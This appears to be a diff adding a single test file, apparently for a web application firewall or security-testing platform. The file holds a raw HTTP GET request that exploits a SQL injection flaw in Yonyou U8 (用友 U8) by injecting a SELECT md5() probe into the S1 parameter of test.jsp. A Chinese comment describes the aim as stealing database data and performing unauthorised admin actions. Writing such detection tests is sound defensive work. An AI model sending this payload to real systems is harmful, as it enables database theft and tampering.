@@ -1,0 +1,9 @@
+# 利用【用友 U8 SQL注入漏洞获取数据库敏感信息】-30000358
+# 利用用友 U8 SQL注入漏洞获取数据库敏感信息，修改数据，并在受影响站点的上下文中执行未经授权的管理操作。
+GET /yyoa/common/js/menu/test.jsp?acid=30000358&doType=101&S1=%28SELECT%20md5%28999999999%29%29&bid=hd_tag_m8mv2660 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2660
+RM-PRO-Token: a3f0d28e86111fa6b826808f3e944060
+RM-PRO-Time: 1742808548850
+User-Agent: curl/7.83.1
+
